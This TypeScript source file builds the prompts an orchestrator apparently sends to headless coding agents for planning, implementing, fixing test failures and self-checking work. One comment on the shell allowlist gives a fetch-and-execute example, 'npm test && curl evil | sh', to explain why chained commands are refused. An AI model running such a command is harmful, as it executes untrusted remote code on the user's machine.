import { BLOCKED, DONE } from "./sentinel"

/**
 * The phase prompts: kantan's actual interface with the agent. Everything else
 * in this project is plumbing around these strings.
 *
 * Three things about them are not style choices.
 *
 * **The sentinel.** `AskUserQuestion` does not exist in `claude -p`, so a
 * question and a completion both exit `result/success` and are indistinguishable
 * by message type (design 3.2). Completion is therefore never inferred from exit
 * status: each prompt requires the agent's **final message** to end with
 * `ORCH: done` or `ORCH: blocked <reason>`. The wording says "final message"
 * rather than "your answer" because a plan-writing agent given looser phrasing
 * has been observed writing the sentinel into the plan file instead of its reply.
 *
 * The two literals come from `src/sentinel.ts`, which parses them, rather than
 * being typed again here. They are the one place the emitting side and the
 * parsing side have to agree exactly, and a one-character drift would make every
 * finished phase read as a question: no exception, no error, every run parked at
 * a gate that should have passed.
 *
 * **The suppressions.** `writing-plans` ends by offering execution choices and
 * asking which. `executing-plans` stops after the first three tasks to report and
 * wait, raises concerns with its human partner, and finishes by running
 * `finishing-a-development-branch`. Every one of those is a human checkpoint, and
 * a checkpoint in headless mode is a silent stall, so each is suppressed by name.
 * The question-and-answer skill is not named anywhere here, not even negatively:
 * naming it is one of the ways it gets loaded, and it would stall every run.
 *
 * **No normalization.** Paths and task text are interpolated exactly as handed in.
 * A plan path is dictated by the server and recorded in the run log's `phase`
 * record, which is what the gate renders, so a prompt that trimmed, slugified or
 * re-encoded it would point the agent at a file nothing else looks for.
 *
 * Prompt text sits at column zero inside the template literals on purpose: what
 * the source shows is what the agent receives, with no dedent pass in between.
 * Phrases the tests pin are kept on one source line for the same reason.
 */

/**
 * What a prompt needs to know about the task. Narrower than `backlog.Task` by
 * design: `ref` is non-optional here, so a ref-less task cannot reach a prompt
 * without someone deciding what its ref is first, and `line` is left out because
 * it is valid only for the string it was parsed from.
 */
export interface TaskSpec {
  /** The `T<n>` label the task is addressed by. */
  ref: string
  text: string
  /** The feature file the task came from, relative to the repo root. */
  featurePath: string
}

/**
 * The contract every phase prompt ends with. Shared so the three cannot drift,
 * and spelled out to the letter because the parser matches the line exactly: it
 * reads `ORCH: Done`, a backticked sentinel, a list item and an indented line all
 * as a question, which parks the run at a human.
 *
 * The blocked form asks for a reason even though the parser accepts the bare
 * prefix with an empty one. A blocked run with no reason stops a human in front
 * of a screen that does not say why.
 */
/**
 * What the agent may actually run, said out loud.
 *
 * Without this the agent reaches for an ordinary shell one-liner, the
 * allowlist refuses it, and **headless turns a refusal into a silent denial** -
 * there is no prompt to approve, so the tool simply fails. Observed in a real
 * planning run on
 * `timeout 10 cat …; echo ----SENTRY; sed -n 1,40p …; grep -n "=>" …`.
 *
 * Two things that cost a run if the agent does not know them, and which it
 * cannot discover by trying:
 *
 * - **Reading files is a tool, not a shell.** `Read`, `Glob` and `Grep` are
 *   granted; `cat`, `sed`, `head`, `find` and `ls` are not, and never will be -
 *   `src/permissions.ts` grants the five file tools, git, and at most one rule
 *   for the project's own test program.
 * - **A compound command needs a rule per segment.** The CLI evaluates
 *   `a && b`, `a; b` and `a | b` one command at a time, so `Bash(git *)` does
 *   not allow `git log | head`, and chaining anything onto a granted command
 *   loses the grant. That is deliberate: it is what stops `Bash(npm *)`
 *   allowing `npm test && curl evil | sh`.
 */
const TOOLS_CONTRACT = `## What you can run here

Read files with the **Read**, **Glob** and **Grep** tools. Do not shell out to read:
\`cat\`, \`sed\`, \`head\`, \`tail\`, \`ls\` and \`find\` are not granted, and a denied
tool call here is silent - nobody is asked and nothing approves it.

The shell is for \`git\` (and, where this project has one, its test command) and
nothing else.

**Run one command per call.** Permission is matched per command, so \`a && b\`,
\`a; b\` and \`a | b\` each need every part granted separately - chaining anything
onto \`git\` loses the grant and the whole call is refused.`

const HEADLESS_CONTRACT = `## Nobody can answer you

This conversation runs headless. There is no interactive question tool here, and from
outside, a question that waits looks exactly like a finished turn, so a question hangs
the run rather than reaching anyone. Wherever a skill tells you to raise a concern with
your human partner, ask for clarification, check in, or report and wait for feedback:
do not pause and do not ask. Decide it yourself and say what you decided, or end the
turn blocked.

## How to end your turn

When the work above is finished, the last line of your final message must be exactly:

${DONE}

When you cannot finish it, the last line of your final message must instead be:

${BLOCKED} <one line saying what is in the way>

Use that second form instead of asking a question; a human reads it and replies.

The line is matched literally, so:

- It is the very last line of your final message, with nothing after it at all: no
  sign-off, no further prose, no closing code fence. It is the last thing you write.
- It begins at column zero, with no indentation, no list marker, no backticks, no bold
  and no trailing period.
- Lowercase after the colon, and exactly one space after the colon.
- When you are blocked, always say why on that same line. It is accepted with no reason
  at all, and then the human reading it has nothing to go on.
- Do not quote this contract back to me anywhere in your final message. Just write the
  line.
- Never write that line into a file: not into the plan, not into the code, not into a
  commit message. It belongs in your message to me and nowhere else.`

/**
 * The human's unfinished work, when a run was explicitly allowed to start on a
 * dirty tree.
 *
 * **The prompt is the only channel that can say whose work this is.** The agent
 * arrives in a checkout holding changes it did not write, and every instinct a
 * coding model has about an unexpected diff is the wrong one here: reverting
 * it, `git checkout --`-ing it, stashing it, or sweeping it into a commit whose
 * message describes something else. None of those is recoverable from the
 * user's side - the whole reason they opted in is that the work is committed
 * nowhere.
 *
 * Empty for every ordinary run, where the tree was proved clean and there is
 * nothing to say. The files are listed rather than merely counted because "the
 * tree is dirty" is not actionable: the agent has to be able to tell its own
 * output from the human's.
 */
function inheritedWork(dirty: readonly string[]): string {
  if (dirty.length === 0) return ""
  return `
## Files the human was already working on

This checkout was **not** clean when this run started, and that was deliberate: a human
asked for the work to continue from where they had left it. These files already had
uncommitted changes before you began:

${dirty.map((path) => `- ${path}`).join("\n")}

That is their unfinished work. It is not a mistake, and it is not yours to undo.

- Build on it. Read those files before you change them; they may already hold part of what
  you are about to write.
- Do **not** revert, discard, stash or check out any of them, and do not run
  \`git checkout --\`, \`git restore\`, \`git reset\` or \`git stash\` against them. There is no
  committed copy to get back - that is exactly why they are listed here.
- Do not sweep them into a commit of your own unless your work really changed them. Name
  the files you changed as a pathspec, as you would anyway, so their work stays theirs to
  commit.
- If one of them contradicts what the plan asks for, say so in your final message and do
  the smallest thing that works. Do not resolve it by throwing their edit away.
`
}

/**
 * The four clauses that change when a project has no test command.
 *
 * A project may have `testCmd: null`, and then the agent verifies its own work
 * (the user's decision, 2026-10-12). Three of the prompts below assert
 * something that is **false** for such a project - that kantan runs a
 * test command and branches on its exit code - and a prompt that lies about who
 * checks the work is the most expensive drift there is here: the agent is told
 * a safety net exists and stops short of checking itself, which is the one
 * thing it was asked to do.
 *
 * This is the same judgement `RETIRED` in `src/projects.ts` records, where a
 * whole field was removed rather than leave two prompt lines untrue. So the
 * claim is a function of the project, not a constant.
 *
 * They are small on purpose. Everything else in each prompt holds either way -
 * including the rule that the agent never touches the backlog file, which did
 * not change: what changed is *why* the server may tick, not who ticks.
 */

/** Why a plan must not include a step that ticks the box. */
function whoTicks(testCmd: string | null): string {
  return testCmd === null
    ? `kantan records the task as done itself. This project has no test command,
  so a separate turn at the end will ask you to verify your own work and the task is
  recorded on that answer; a plan step that ticks the box would mark it done before
  anything at all had checked it.`
    : `kantan records the task as done
  itself, and only after it has run the project's test command and seen it pass by exit
  code. A plan step that ticks the box would mark the task done on a failing build.`
}

/**
 * Who checks the work, in the implement prompt's "leave the backlog alone" rule.
 *
 * Each branch carries its own closing sentence and its own line wrapping, which
 * looks like duplication and is not: the prompts are hard-wrapped and what the
 * source shows is what the agent receives, so a shared tail would re-wrap
 * differently after each clause. Owning the whole paragraph is also what lets a
 * branch's **first** line be short: each one is interpolated after a clause that
 * is already on the line, so its first break is measured from the end of that
 * clause and not from column zero. `test/prompts.test.ts`'s inline snapshot pins
 * both prompts byte for byte, which is how a re-wrap that forgot that shows up.
 */
function whoVerifies(testCmd: string | null): string {
  return testCmd === null
    ? `kantan records the task itself, and this
  project has no test command: a separate turn at the end will ask you to verify your own
  work, and the task is recorded on that answer. Nothing outside this conversation checks
  it. Editing that file can only put the backlog out of step with what was actually
  checked.`
    : `kantan runs the project's test command
  itself and records the outcome from the exit code; it never takes an agent's word for a
  passing build. Editing that file can only put the backlog out of step with what was
  actually verified.`
}

/**
 * How to work. With a command, TDD unconditionally - the suite is there and the
 * server will run it. Without one, the repo may genuinely have no runner, and
 * the derived allowlist grants no shell but git (`src/permissions.ts`), so
 * "watch it fail" can be an instruction the agent cannot carry out. Telling it
 * to do the impossible spends a turn on permission denials.
 */
function tddRule(testCmd: string | null): string {
  return testCmd === null
    ? `Use \`superpowers:test-driven-development\` as far as this repo allows: where there is any
way to run a test here, write the failing test first, watch it fail, then the smallest code
that makes it pass. Where there is not, keep each change small and check it before moving on.`
    : `Use \`superpowers:test-driven-development\` for every change: the failing test first,
watch it fail, then the smallest code that makes it pass.`
}

/** The mid-sentence clause in `answerPrompt` and `resumePrompt`. */
function checkYourWork(testCmd: string | null): string {
  return testCmd === null
    ? `check your work by whatever means this repo gives you`
    : `run the suite yourself to check`
}

/**
 * The self-check turn: what a project with no test command gets **instead of**
 * the server running a suite.
 *
 * This is the user's 2026-10-12 decision in the only form that can carry it -
 * words an agent reads. It deliberately reports through the **existing**
 * sentinel: `CLAUDE.md` says that string is load-bearing and must not be
 * "improved", so `ORCH: done` means "I checked it and it is right" and
 * `ORCH: blocked <reason>` means "I could not confirm it", with no second
 * vocabulary to keep in step.
 *
 * Two things in the wording are load-bearing rather than tone.
 *
 * **It says nothing else will check the work.** That is true, and it is what
 * makes `blocked` an available answer instead of an admission of failure: an
 * agent that believes a suite will catch its mistakes has every reason to say
 * done and move on. The design's rule is "always print the exit code, never
 * 'looks good'", and the honest extension at this end is to tell the agent
 * there is no exit code coming.
 *
 * **It asks how the work was checked, not whether.** "I verified it" is not a
 * verification, and that sentence is the only evidence this run will ever carry
 * - `EndRecord.verifiedBy` records that it was a self-check, and the prose in
 * the log is all a human has to judge it by.
 *
 * It is a separate turn rather than a reading of the implement turn's own
 * `ORCH: done`, because those mean different things: that one claims the work
 * is finished, and this one claims it was checked. Collapsing them would make
 * "the agent verifies" a relabelling of what already happened rather than a
 * step that occurs.
 */
export function selfCheckPrompt({ task, planPath }: { task: TaskSpec; planPath: string }): string {
  return `The work on ${task.ref} is finished as far as you are concerned. Before kantan records that
task as done, verify it yourself.

## There is no test command for this project

kantan normally runs the project's own test command and reads the status it returns, and it
never takes an agent's word for working code. This project has no such command, so that
check does not exist here: **nothing outside this conversation is going to look at this
work.** kantan will record in the run log, and in the commit message that ticks the task,
that it was checked by you and by nothing else.

## Verify it

- Re-read the plan at ${planPath} and confirm every item it lists is actually done, not
  merely started.
- Re-read your own changes rather than working from memory of what you meant to write:
  \`git diff\` and \`git log\` on the branch that is already checked out.
- Exercise the code if this repo gives you any way to - run it, run a script, run whatever
  tests exist even though kantan will not.
- Look for what a suite would have caught: something you referenced and never wrote, an
  import that does not resolve, a path through the code you never once executed, a case the
  task names that nothing handles.
- If you find something wrong, fix it, commit it, and then check it again.

## Then say which it is

- If you have checked it and it is right, say **how you checked** - what you read, what you
  ran, what you saw - and then end the turn done. Be specific: "I verified it" tells a human
  nothing, and your sentence is the only evidence this run will carry.
- If you cannot confirm it, end the turn blocked, naming the one thing you could not
  establish. Nothing is checking behind you, so a done you are not sure of is worse than a
  blocked line a human can act on.
- Leave ${task.featurePath} exactly as it is. kantan records the task itself, on the answer
  you give here.

${TOOLS_CONTRACT}

${HEADLESS_CONTRACT}
`
}

/**
 * The plan phase. One task in, one plan file out, at the path the server
 * dictated. Nothing is implemented and no test is run: the human at the gate
 * reads the plan before any code exists.
 *
 * Invoked as a slash command on the first line. That is the form `docs/probes/
 * probeAB.mjs` probed, where the skill loaded and the turn ran headless without
 * stalling, and it is consistent with the 2026-10-11 capture, which announced the
 * skill with no `Skill` tool_use of its own. Two differences from the probe are
 * untested: the arguments here run over many lines rather than one, and the
 * capture's own prompt text was not kept, so this wording is new.
 */
export function planPrompt({
  task,
  planPath,
  testCmd,
  dirty = [],
}: {
  task: TaskSpec
  planPath: string
  /** `null` when the project has no suite, which changes who verifies the
   * work; see the clause helpers above. */
  testCmd: string | null
  /** Paths the human was already working on; see `inheritedWork`. */
  dirty?: readonly string[]
}): string {
  return `/superpowers:writing-plans Write an implementation plan for one backlog task, exactly as instructed below.

## The task

- Ref: ${task.ref}
- Feature file: ${task.featurePath}
- Task: ${task.text}

Read the feature file for the surrounding context, and read whatever code the task
touches.

## Where the plan goes

Write the plan to exactly this path, relative to the repository root:

${planPath}

That path is dictated, and it overrides the skill's own naming convention. A human
reviews that exact file next and nothing else is read in its place, so a plan saved
under a name you preferred is invisible and the run stalls. Do not rename it, do not
move it, do not add a date, prefix or suffix of your own, and do not create a second
plan file alongside it.

## This turn plans, and does nothing else

- Do not implement any part of the task: no production code, no test code, no fixtures,
  no scaffolding.
- Do not run the test suite, a single test, a linter or a build.
- Do not offer me a choice of execution modes, and do not ask which execution mode,
  session or approach to use. That is already decided: a separate conversation will
  execute this plan inline, and asking would stall this run.
- Work in the checkout as you find it. Do not create a worktree, do not create or
  switch branches, and do not run \`superpowers:finishing-a-development-branch\`.
- Do not include a step that ticks the task's checkbox, or that edits
  ${task.featurePath} in any other way. ${whoTicks(testCmd)}
- Write for an engineer who has no context for this codebase and cannot see this
  conversation: the plan file is the whole handoff, so a decision you make here and
  leave unwritten is lost. Where the task leaves a choice open, make the most
  reasonable one and record it in the plan.

## Commit

Commit the plan file on the branch that is already checked out, so the gate does not
sit on a dirty tree. Commit nothing else: name the plan file as a pathspec rather than
staging everything, because the tree may hold work that is not yours.
${inheritedWork(dirty)}
${TOOLS_CONTRACT}

${HEADLESS_CONTRACT}
`
}

/**
 * The implement phase. A separate conversation from the plan (design 3.1), which
 * is what lets the two phases run different models, and which means this prompt
 * inherits no context: the plan file is the entire brief.
 *
 * It does not mention the checkbox at all. The server owns the tick, after the
 * test command passes by exit code (design 3.3), and an agent that ticks does so
 * before verification. The rule is carried instead as "leave the feature file
 * alone", which also neutralises the tick step that `writing-plans` tends to put
 * into the plan the agent is reading.
 */
export function implementPrompt({
  task,
  planPath,
  testCmd,
  dirty = [],
}: {
  task: TaskSpec
  planPath: string
  testCmd: string | null
  /** Paths the human was already working on; see `inheritedWork`. */
  dirty?: readonly string[]
}): string {
  return `/superpowers:executing-plans Implement one backlog task from the approved plan named below, exactly as instructed.

## The plan

A human has already reviewed and approved this plan:

${planPath}

Read it first. You have not seen the conversation that wrote it and cannot ask it
anything, so that file plus the code are your whole brief. It is the plan for ${task.ref},
which came from ${task.featurePath}, and reads: ${task.text}

${tddRule(testCmd)}

## Execute it inline, in this conversation, to the end

- Work through every task in the plan, not just the first batch. Do not pause between batches
  to report and wait for feedback, and do not stop to have the plan reviewed. Nobody is
  waiting to answer, and a pause here stalls the run.
- Execute the plan yourself, here, inline. Do not ask which execution mode to use, do
  not offer me execution options, and do not hand the work to a subagent or to another
  session.
- If a step is wrong, or does not fit what you find in the code, do the smallest thing
  that makes it work and say what you changed in your final message. Do not come back
  to ask first.

## The branch, the commits, and what to leave alone

- Commit your work on the branch that is already checked out. Do not create a branch, do
  not switch branches, do not create a worktree, do not merge, do not rebase, do not push,
  do not open a pull request, and do not run \`superpowers:finishing-a-development-branch\`.
- Commit as you go, naming the files you changed as a pathspec rather than staging
  everything, because the tree may hold work that is not yours.
- Leave ${task.featurePath} exactly as it is, and skip any step in the plan that would edit
  it or change ${task.ref}'s line in it. ${whoVerifies(testCmd)}
${inheritedWork(dirty)}
${TOOLS_CONTRACT}

${HEADLESS_CONTRACT}
`
}

/**
 * Gate rejection. This resumes the **plan** session (design 3.1), so the task,
 * the feature file and the first turn's instructions are all still in context.
 * It is written as a continuation for that reason: restating the task would
 * invite a fresh plan instead of a revision of the one the human just read, and
 * re-invoking the skill would restart planning outright.
 */
export function feedbackPrompt({
  planPath,
  feedback,
}: {
  planPath: string
  feedback: string
}): string {
  return `A human read that plan at the gate and did not approve it. Their feedback, verbatim:

${feedback}

Revise the plan to answer it. Keep working in the same file, at the same path:

${planPath}

Rewrite the parts the feedback touches, rather than appending a change log or a
revision history, and leave the rest of the plan as it stands. Then commit that file on
the branch already checked out, and nothing else.

Everything from the first turn still applies: plan only, do not implement anything, run
no tests, leave the backlog file alone, do not offer or ask which execution mode to use,
and do not run \`superpowers:finishing-a-development-branch\`.

${TOOLS_CONTRACT}

${HEADLESS_CONTRACT}
`
}

/**
 * A refine turn: the server ran the tests and they failed.
 *
 * Task 13's seam. The loop in design §3 has a `refine` phase and nothing was
 * written to speak to it, and it cannot be assembled by the caller either:
 * every turn needs `HEADLESS_CONTRACT`, which is module-private here precisely
 * so the sentinel the parser accepts and the sentinel a prompt dictates cannot
 * drift. So the string lives beside the other three.
 *
 * It reports the **exit code** rather than an interpretation, because the exit
 * code is the whole of design §3.3: the server never tells the agent the tests
 * passed, and never accepts the agent's word that they did. It also does not
 * say how many attempts have been made - an attempt count invites the agent to
 * take a different kind of swing at a problem it is making progress on, and
 * progress is measured here by the failure signature, not by counting.
 *
 * `output` is already bounded by the caller: `runTests` keeps up to 1 MiB per
 * stream and the whole of it, twice, on every refine turn is real money.
 */
export function refinePrompt({
  task,
  planPath,
  exitCode,
  output,
  timedOut,
}: {
  task: TaskSpec
  planPath: string
  exitCode: number
  output: string
  timedOut: boolean
}): string {
  return `The test command just ran and it did not pass. Fix it and finish the work.

## What the suite did

It exited ${exitCode}${timedOut ? ", after kantan killed it for exceeding the time limit" : ""}. Here is the tail of what it printed, stdout and stderr together:

<test-output>
${output}
</test-output>

kantan runs that command itself and reads the exit code, so this is not a report you can
talk me out of and not something to work around: a passing suite by exit code is the only
way this task finishes.${timedOut ? " A run that never finishes counts as a failure, so look for a test that hangs or waits for input." : ""}

## What to do now

- Diagnose the actual failure before changing anything. Do not delete, skip, or weaken a
  test to make the suite green, and do not change the test command.
- Keep following the plan at ${planPath}. This is still ${task.ref}.
- Make the change, run the suite yourself to check it, and commit on the branch that is
  already checked out, naming the files you changed as a pathspec.
- Leave ${task.featurePath} exactly as it is.

${TOOLS_CONTRACT}

${HEADLESS_CONTRACT}
`
}

/**
 * The human's reply to a question the agent asked.
 *
 * Task 13's seam, like `refinePrompt`. A question is not the gate: the gate has
 * approve and feedback, and `feedbackPrompt` says a human read the plan and did
 * not approve it, which is the wrong thing to tell an agent that asked
 * something and is waiting for the answer.
 *
 * Both phases can ask, and the two replies cannot be one string: an answer sent
 * into the planning conversation must not start the implementation, and an
 * answer sent into the implement conversation must not re-open planning. So the
 * surrounding text is shared and the single differing clause is named here,
 * rather than being assembled by the caller - which would put the sentinel
 * contract outside this module.
 *
 * The answer is interpolated verbatim. It arrives on the child's stdin inside a
 * stream-json user message, so `JSON.stringify` escapes every byte of it and
 * there is no shell and no argv length to respect.
 */
export function answerPrompt({
  answer,
  phase,
  testCmd,
}: {
  answer: string
  phase: "plan" | "implement"
  testCmd: string | null
}): string {
  const next =
    phase === "plan"
      ? `Carry on with the plan at that same path, and nothing else: still no implementation, no
tests, no branch of your own, and no edit to the backlog file.`
      : `Carry on with the work from where you stopped. Do not start the plan over and do not
re-run the parts you already finished; continue, ${checkYourWork(testCmd)}, and commit
on the branch that is already checked out.`

  return `You asked a question and nobody could answer it at the time, because this conversation runs
headless. A human has now read it and replied. Their answer, verbatim:

${answer}

${next}

If the answer does not settle it, decide the rest yourself and say what you decided, or end the
turn blocked with the one thing still in the way. Do not ask again: the same thing would happen.

${TOOLS_CONTRACT}

${HEADLESS_CONTRACT}
`
}

/**
 * Picking up a phase that was interrupted mid-work.
 *
 * Task 13's seam. A killed run resumes its session with `--resume`, which
 * restores the conversation but still needs a turn to answer, and re-sending
 * `implementPrompt` is the wrong turn: it re-invokes the execution skill inside
 * a conversation that is already partway through the plan, which is how a
 * resumed run re-does work it had already committed.
 *
 * It deliberately does not say what interrupted the run. A crash, a stop button
 * and a laptop closing look identical from here, and an agent told "you
 * crashed" tends to go looking for the damage.
 */
export function resumePrompt({
  task,
  planPath,
  testCmd,
}: {
  task: TaskSpec
  planPath: string
  testCmd: string | null
}): string {
  return `This conversation was interrupted and has just been resumed. Everything you did before is
still in context, and the files you wrote and the commits you made are still there.

Pick up ${task.ref} from where you stopped, following the plan at ${planPath}.

- Work out what is already done before changing anything: read the files you were editing and
  check \`git log\` and \`git status\` on the branch that is already checked out.
- Do not start the plan over, and do not redo a step you had finished.
- Finish the remaining steps, ${checkYourWork(testCmd)}, and commit as you go,
  naming the files you changed as a pathspec.
- Leave ${task.featurePath} exactly as it is.

${TOOLS_CONTRACT}

${HEADLESS_CONTRACT}
`
}
